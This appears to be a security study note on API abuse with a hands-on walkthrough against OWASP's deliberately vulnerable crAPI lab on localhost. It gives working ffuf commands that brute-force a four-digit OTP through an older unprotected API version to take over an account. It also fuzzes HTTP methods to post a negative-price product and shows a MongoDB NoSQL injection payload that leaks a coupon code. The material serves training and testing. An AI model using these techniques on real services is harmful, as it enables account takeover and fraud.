When we talk about API abuse, what we are referring to is the exploitation of vulnerabilities in application programming interfaces (APIs) that are used to enable communication and data exchange between different applications and services on a network.

A simple example of an API could be the integration of Google Maps into a transport application. Imagine that a transportation application needs to display the map and the route to follow so that users can see the location of the vehicle and the path it will take to reach its destination. Instead of creating its own map, the application could use the Google Maps API to display the map in its application.

In this example, the Google Maps API provides a number of functions and protocols that allow the transportation application to communicate with Google's servers and access the data needed to display the map and route. The Google Maps API also handles the complexity of displaying the map and route on different devices and browsers, allowing the transportation application to focus on its core functionality.

**Postman** is a very popular tool used for testing and debugging APIs. With Postman, developers can send requests to different endpoints and view the responses to verify that the API is working correctly. However, attackers can also use Postman to scan API endpoints for security vulnerabilities and weaknesses.

Some endpoints of an API can accept different request methods, such as GET, POST, PUT, DELETE, etc. Attackers can use fuzzing tools to send a large number of requests to an endpoint looking for vulnerabilities. For example, an attacker could send GET requests to an endpoint to list all available resources, or send POST requests to add or modify data.

Some of the common vulnerabilities that can be exploited through API abuse include:
- [[SQL Injections (SQLI)]]: Attackers can send malicious data in requests in an attempt to inject SQL code into the underlying database.
- [[Cross-Site Request Forgery (CSRF)]]: Attackers can send malicious requests to an API on behalf of an authenticated user to perform unauthorized actions.
- *Exposure of sensitive information*: Attackers can probe API endpoints to obtain sensitive information such as API keys, passwords and usernames.

To prevent abuse of APIs, developers must ensure that the API is designed securely and that all incoming requests are properly validated and authenticated. It is also important to use strong encryption and authentication to protect the data being transmitted through the API.

Developers can use tools such as Postman to test the API for potential vulnerabilities before they are exploited by attackers.

# Examples

The first thing we must do for the realization of this example is to download the latest version of *docker-compose* and install it as follows:

```bash
# Delete older docker-compose version
apt remove docker-compose

curl -L "https://github.com/docker/compose/releases/download/v2.19.1/docker-compose-$(uname -s)-$(uname -m)" -o docker-compose
chmod +x docker-compose
mv docker-compose /usr/local/bin
```

Now we can clone the [crAPI repository](https://github.com/OWASP/crAPI).

To set up we must delete all containers, images, volumes and [[Docker]] networks and then enter the downloaded directory:

```bash
cd deploy/docker
docker-compose pull
docker-compose -f docker-compose.yml --compatibility up -d
```

If during the execution of the last command something does not work, we must delete everything and try again. If after several attempts it does not work, we can download the *develop* version by copying the following command:

```bash
curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml
VERSION=develop docker-compose pull
VERSION=develop docker-compose -f docker-compose.yml --compatibility up -d
```

Once everything is installed we can enter the web at *localhost:8888*, register and log in.

----
> We can take the opportunity to check that all tabs are working (dashboard, forum, shop, etc...). If there is some that does not work, we will have to delete everything and install it again.
----

We can go to the *network* window of our browser to see the web requests. We check the *XHR* option so that it does not show us so much noise and we make the *login* request for example to see what it includes.

We can see that the *login* request sends an *email* and a *password* and returns a *session token* that by its structure seems to be a *JWT*.

To continue working with web requests we will use **Postman**, to install it we can do it in the following way:

```bash
apt install snapd
wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz
sudo tar -xzf postman-linux-x64.tar.gz -C /opt
sudo ln -s /opt/Postman/Postman /usr/bin/postman
```

In **Postman** we proceed to create a new *collection* and copy some endpoints. First we must copy the *login* one in order to get our token (it would be a good idea to save it in *variables* so we don't have to copy and paste it in all requests) and then we can copy others like *dashboard*, *shop/products* and *shop/orders*.

## Example 1

One of the things we can do is to click *I forgot my password*, then it will send to the email the typical four digit *OTP*. If we intercept the request to validate the *OTP*, we see that it is this endpoint:

```
http://localhost:8888/identity/api/auth/v3/check-otp
```

It is a *POST* method in which the following information is sent to you in *JSON* format:

```json
{ "email":"loki@example.com", "otp":"1234", "password":"NewPass123$!" }
```

Let's try a brute force attack with the **ffuf** tool. We will use this tool because it is the same as the **wfuzz** tool but it is programmed in *GO*, which is a language that works very well with sockets. In this case we want to guarantee that everything arrives well because the container of the example is very unstable:

```bash
# With -p 1 we indicate that we want to delay one second per request
# With -mc 200 (matching code) we indicate to display only 200 status codes
ffuf -u http://localhost:8888/identity/api/auth/v3/check-otp -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d '"email":"loki@example.com", "otp":"FUZZ", "password":"NewPass123$!"' -H "Content-Type: application/json" -p 1 -mc 200
```

After a few attempts we see that the server blocks us to avoid this type of attacks.

One of the things that we can try is to change the *versions*, in this case the most recent was *v3*, so we can try with *v2* in case the previous versions are not secured (if these are still exposed to the public):

```bash
ffuf -u http://localhost:8888/identity/api/auth/v2/check-otp -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -X POST -d '"email":"loki@example.com", "otp":"FUZZ", "password":"NewPass123$!"' -H "Content-Type: application/json" -p 1 -mc 200
```

This time we did manage to get the *OTP* since there were no restrictions in *v2* and therefore we changed the password to the user *loki*.

## Example 2

Another thing we can do is to see the *methods* that accept the endpoints of a given API. For this we can do it, for example, with **ffuf** substituting the method of the request by brute force:

```bash
ffuf -u http://localhost:8888/workshop/api/shop/products -w /usr/share/seclists/Fuzzing/http-request-methods.txt -X FUZZ -p 1 -mc 401,200
```

If the *OPTIONS* method is available we can also launch the request with it, because in the response header it usually tells us which methods are available for that endpoint.

As in the case of the */shop/products* endpoint we can change the method from *GET* to *POST* and then we can include a *JSON* in the body of the request of this style:

```json
{ "name":"", "price":"", "image_url":"" }
```

If, for example, we were to modify it in this way, we would publish a product that, when purchased, would give us money instead of spending it:

```json
{ "name":"Don't open the image!", "price":"-1000", "image_url":"https://ychef.files.bbci.co.uk/1280x720/p02ct5b3.jpg" }
```

## Example 3

In this case we will be validating a new coupon with the endpoint */coupon/validate-coupon*. When entering any number it indicates that the coupon is not valid but when intercepting the request we can see that it is a *POST* method that sends a *JSON* with this format:

```json
{ "coupon_code"="1234" }
```

In this case we know that the backend is running *MongoDB* which is a non-relational database, so [[NoSQL Injections]] may be viable:

```json
{ "coupon_code": { "$ne":"1234" } }
```

In this case we are sure that there is no coupon with value *1234*, so being vulnerable to [[NoSQL Injections]], it returns the coupon code.